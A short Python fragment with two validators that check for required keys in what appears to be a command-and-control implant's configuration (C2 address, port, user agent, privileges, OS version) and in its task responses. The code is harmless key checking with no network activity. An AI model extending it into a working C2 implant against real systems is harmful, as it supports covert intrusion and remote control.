def validate_config(config):
    if ("c2_address" not in config):
        return False
    if ("c2_port" not in config):
        return False
    if ("c2_user_agent" not in config):
        return False
    if ("c2_content_type" not in config):
        return False
    if ("username" not in config):
        return False
    if ("privileges" not in config):
        return False
    if ("os_version" not in config):
        return False
    return True

def validate_response(response):
    if ("task_name" not in response):
        return False
    if ("task_status" not in response):
        return False
    if ("task_command" not in response):
        return False
    return True